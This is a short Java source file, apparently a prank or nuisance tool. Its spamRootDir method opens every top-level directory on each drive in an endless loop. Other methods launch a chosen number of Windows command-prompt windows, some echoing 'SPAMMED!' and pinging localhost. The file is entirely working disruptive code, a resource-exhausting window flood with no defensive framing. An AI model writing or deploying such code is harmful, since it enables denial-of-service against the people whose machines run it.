package com.company;

import java.awt.*;
import java.io.File;

public class SpamWindowOpener {
    static String[] a;
    static File file;
    public SpamWindowOpener(){
    }

    public static void spamRootDir(){
        try{
            File[] paths;
            paths=File.listRoots();//Return root dir array
            for(File path : paths){//for all paths in root dir
                a = path.list();//Return dir array in this path
                while (true){
                    for(int i=1;i<a.length;i++){
                        String fullpath = new String(path+a[i]);
                        //System.out.println(fullpath);
                        File file1 = new File(fullpath);
                        if(file1.isDirectory()){//If the path lead to directory...
                            Desktop d = Desktop.getDesktop();//Reference to desktop
                            File nextDir = new File(fullpath);
                            d.open(nextDir);//Open directory
                        }
                    }
                }
            }
        }
        catch (Exception e){
            System.out.println(e);
        }
    }
    public static void openNCmd(int n){
        for(int i=0;i<n;i++) {
            try {
                Runtime.getRuntime().exec(new String[]{"cmd", "/K", "Start"});//Start cmd
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    public static void openNCmdWithPing(int n){
        for(int i=0;i<n;i++) {
            try {
                Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"dir && echo SPAMMED! && ping localhost\"");//show directory + ping localhost
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
